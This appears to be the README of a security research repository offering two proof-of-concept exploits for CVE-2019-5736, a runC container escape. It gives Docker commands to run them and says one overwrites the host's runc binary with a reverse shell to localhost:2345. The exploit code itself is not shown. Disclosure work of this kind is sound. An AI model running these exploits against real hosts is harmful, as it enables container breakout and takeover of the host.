Two POCs for CVE-2019-5736.

www.twistlock.com/labs

## Running the POCs
Note that running the POCs will overwrite the runC binary on the host. 

It is highly recommened that you will create a copy of your runC binary (normally at /usr/sbin/runc) before running one of the POCs.

Clone the repository:
```sh
$ git clone https://github.com/YuvalAvra/RunC-CVE-2019-5736
```

### Exec POC
Overwrites runc with a simple program that prints a string.

Running the exec POC:
```sh
$ docker build -t image_name:latest /path/to/exec_POC
$ docker run -d --rm --name container_name image_name:latest
$ docker exec container_name bash
```
### Malicious Image POC
Overwrites runc with a simple reverse shell bash script that connects to localhost:2345.

Running the malicious image POC:
```sh
$ docker build -t image_name:latest /path/to/malicious_image_poc
$ docker run --rm image_name:latest
```
